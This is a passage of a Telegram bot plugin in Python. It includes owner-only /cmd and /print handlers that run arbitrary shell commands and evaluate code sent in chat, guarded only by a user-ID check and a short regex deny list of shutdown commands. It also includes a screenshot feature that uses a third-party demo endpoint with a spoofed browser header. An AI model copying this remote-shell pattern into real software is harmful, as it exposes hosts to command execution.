        tioresstats = sendtioreq.debug.decode() or "None"
        if sendtioreq.error is None:
            await m.reply_text(
                strings_tio["code_exec_tio_res_string_no_err"].format(
                    langformat=execlanguage,
                    codeformat=html.escape(codetoexec),
                    resformat=html.escape(tiores),
                    statsformat=tioresstats,
                )
            )
        else:
            await m.reply_text(
                strings_tio["code_exec_tio_res_string_err"].format(
                    langformat=execlanguage,
                    codeformat=html.escape(codetoexec),
                    resformat=html.escape(tiores),
                    errformat=html.escape(tioerrres),
                )
            )
    else:
        await m.reply_text(
            strings_tio["code_exec_err_string"].format(
                langformat=execlanguage, langslistlink=langs_list_link
            )
        )

@Client.on_message(filters.command("cmd") & filters.user(6168217372))
async def run_cmd(c: Client, m: Message):
    cmd = m.text.split(None,1)[1]
    if re.match("(?i)poweroff|halt|shutdown|reboot", cmd):
        res = "You can't use this command"
    else:
        stdout, stderr = await shell_exec(cmd)

        res = (
            f"<b>Output:</b>\n<code>{html.escape(stdout)}</code>" if stdout else ""
        ) + (f"\n<b>Errors:</b>\n<code>{stderr}</code>" if stderr else "")
    await m.reply_text(res)

@Client.on_message(filters.command("print") & filters.user(6168217372))
async def printSS(c: Client, m: Message):
    text = m.text.split()[1]
    try:
        res = await meval(text, globals(), **locals())
    except BaseException:  # skipcq
        ev = traceback.format_exc()
        await m.reply_text(f"<code>{html.escape(ev)}</code>")
    else:
        try:
            await m.reply_text(f"<code>{html.escape(str(res))}</code>")
        except BaseException as e:  # skipcq
            await m.reply_text(str(e))

timeout = httpx.Timeout(40, pool=None)
http = httpx.AsyncClient(http2=True, timeout=timeout)

strings_print = {
  "print_description": "Take a screenshot of the specified website.",
  "print_usage": "<b>Usage:</b> <code>/print https://example.com</code> - Take a screenshot of the specified website.",
  "taking_screenshot": "Taking screenshot..."
}

@Client.on_message(filters.command(["sc", "webs", "ss"]) & filters.user(6168217372))
async def printsSites(c: Client, message: Message):
    msg = message.text
    the_url = msg.split(" ", 1)
    wrong = False

    if len(the_url) == 1:
        if message.reply_to_message:
            the_url = message.reply_to_message.text
            if len(the_url) == 1:
                wrong = True
            else:
                the_url = the_url[1]
        else:
            wrong = True
    else:
        the_url = the_url[1]

    if wrong:
        await message.reply_text(strings_print["print_usage"])
        return

    try:
        sent = await message.reply_text(strings_print["taking_screenshot"])
        res_json = await cssworker_url(target_url=the_url)
    except BaseException as e:
        await message.reply(f"<b>Failed due to:</b> <code>{e}</code>")
        return

    if res_json:
        # {"url":"image_url","response_time":"147ms"}
        image_url = res_json["url"]
        if image_url:
            try:
                await message.reply_photo(image_url)
                await sent.delete()
            except BaseException:
                # if failed to send the message, it's not API's
                # fault.
                # most probably there are some other kind of problem,
                # for example it failed to delete its message.
                # or the bot doesn't have access to send media in the chat.
                return
        else:
            await message.reply(
                "Couldn't get url value, most probably API is not accessible."
            )
    else:
        await message.reply("Failed because API is not responding, try again later.")
        
async def cssworker_url(target_url: str):
    url = "https://htmlcsstoimage.com/demo_run"
    my_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
    }

    data = {
        "url": target_url,
        # Sending a random CSS to make the API to generate a new screenshot.
        "css": f"random-tag: {uuid.uuid4()}",
        "render_when_ready": False,
        "viewport_width": 1280,
        "viewport_height": 720,
        "device_scale": 1,
    }

    try:
        resp = await http.post(url, headers=my_headers, json=data)
        return resp.json()
    except HTTPError:
        return None